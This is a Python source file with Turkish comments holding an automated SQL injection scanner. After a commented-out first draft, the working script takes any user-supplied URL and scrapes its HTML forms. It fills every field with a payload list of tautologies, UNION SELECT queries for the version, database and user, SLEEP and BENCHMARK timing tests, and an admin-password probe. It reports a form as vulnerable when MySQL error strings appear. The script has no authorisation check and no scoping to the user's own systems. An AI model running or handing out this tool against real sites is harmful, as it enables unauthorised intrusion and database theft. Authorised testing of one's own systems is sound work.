# import requests
# from bs4 import BeautifulSoup
#
#
# def fetch_page(url):
#     """
#     Belirtilen URL'den HTML içeriğini alır.
#     """
#     try:
#         response = requests.get(url, timeout=5)
#         response.raise_for_status()  # HTTP hatalarını kontrol et
#         return response.text
#     except requests.RequestException as e:
#         print(f"Hata: {e}")
#         return None
#
#
# def parse_forms(html):
#     """
#     HTML içeriğindeki formları bulur ve BeautifulSoup nesnesi olarak döner.
#     """
#     soup = BeautifulSoup(html, "html.parser")
#     return soup.find_all("form")
#
#
# def test_sql_injection(form, base_url):
#     """
#     Bir form üzerinde SQL Injection testi yapar.
#     """
#     # Form action ve method bilgilerini al
#     action = form.get("action")
#     method = form.get("method", "get").lower()
#     # Zararlı payload (basit örnek)
#     injection_payload = "' OR '1'='1"
#
#     # Formdaki input alanlarını tespit edip, hepsine payload ekliyoruz
#     inputs = form.find_all("input")
#     data = {}
#     for input_field in inputs:
#         name = input_field.get("name")
#         if name:
#             data[name] = injection_payload
#
#     # Eğer action boşsa, form aynı sayfaya gönderilir; değilse, base_url ile birleştir.
#     if action:
#         if action.startswith("http"):
#             target_url = action
#         else:
#             target_url = base_url.rstrip("/") + "/" + action.lstrip("/")
#     else:
#         target_url = base_url
#
#     try:
#         print(f"\nTest ediliyor: {target_url} (Method: {method.upper()})")
#         if method == "post":
#             response = requests.post(target_url, data=data, timeout=5)
#         else:
#             response = requests.get(target_url, params=data, timeout=5)
#
#         # Basit bir kontrol: Yanıt içinde payload'un izlerini arıyoruz
#         if injection_payload in response.text:
#             print(f"[!] Potansiyel SQL Injection açığı tespit edildi!")
#         else:
#             print(f"[✔] Görünürde bir açık tespit edilmedi.")
#     except Exception as e:
#         print(f"Hata: {e}")
#
#
# def perform_sql_injection_test(url):
#     """
#     Belirtilen URL üzerinde SQL Injection testlerini gerçekleştirir.
#     """
#     html = fetch_page(url)
#     if not html:
#         print("HTML içeriği alınamadı.")
#         return
#
#     forms = parse_forms(html)
#     print(f"\n{len(forms)} form bulundu.")
#
#     for form in forms:
#         test_sql_injection(form, url)
#
#
# if __name__ == "__main__":
#     target_url = input("Hedef URL (http:// veya https:// ile girin): ")
#     perform_sql_injection_test(target_url)
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# SQL Injection için gelişmiş payload listesi
PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1/*",
    "' UNION SELECT null, null --",
    "' UNION SELECT null, version() --",
    "' UNION SELECT null, database() --",
    "' UNION SELECT user(), current_user() --",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' OR SLEEP(5) --",
    "' OR BENCHMARK(1000000,MD5('test')) --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    "' AND 1=(SELECT COUNT(*) FROM pg_sleep(5)) --",
    "' OR 'a'='a",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%') --",
]


def fetch_page(url):
    """
    Belirtilen URL'den HTML içeriğini alır.
    """
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()  # HTTP hatalarını kontrol et
        return response.text
    except requests.RequestException as e:
        print(f"Hata: {e}")
        return None


def parse_forms(html):
    """
    HTML içeriğindeki formları bulur ve BeautifulSoup nesnesi olarak döndürür.
    """
    soup = BeautifulSoup(html, "html.parser")
    return soup.find_all("form")


def test_sql_injection(form, base_url):
    """
    Bir form üzerinde SQL Injection testi yapar.
    """
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = form.find_all("input")

    for payload in PAYLOADS:
        data = {}

        for input_field in inputs:
            name = input_field.get("name")
            input_type = input_field.get("type", "text")
            if name:
                data[name] = payload if input_type != "submit" else input_field.get("value", "")

        target_url = urljoin(base_url, action) if action else base_url

        try:
            print(f"\n[🔎] Test ediliyor: {target_url} (Payload: {payload})")
            if method == "post":
                response = requests.post(target_url, data=data, timeout=5)
            else:
                response = requests.get(target_url, params=data, timeout=5)

            error_signatures = ["SQL syntax", "mysql_fetch", "You have an error in your SQL syntax", "Warning: mysql"]
            if any(error in response.text for error in error_signatures):
                print(f"[⚠] SQL Injection açığı tespit edildi! (Payload: {payload})")
                break  # Açık bulunduysa döngüden çık
            else:
                print(f"[✔] {payload} başarısız oldu.")
        except Exception as e:
            print(f"Hata: {e}")


def perform_sql_injection_test(url):
    """
    Belirtilen URL üzerinde SQL Injection testlerini gerçekleştirir.
    """
    print(f"\n🎯 Hedef: {url}")
    html = fetch_page(url)
    if not html:
        print("HTML içeriği alınamadı, bağlantıyı kontrol edin.")
        return

    forms = parse_forms(html)
    print(f"\n🔍 {len(forms)} form bulundu.")

    for form in forms:
        test_sql_injection(form, url)


if __name__ == "__main__":
    target_url = input("Hedef URL (http:// veya https:// ile girin): ").strip()
    if not target_url.startswith(("http://", "https://")):
        print("Hata: Geçerli bir URL giriniz (http:// veya https:// ile başlamalı).")
    else:
        perform_sql_injection_test(target_url)

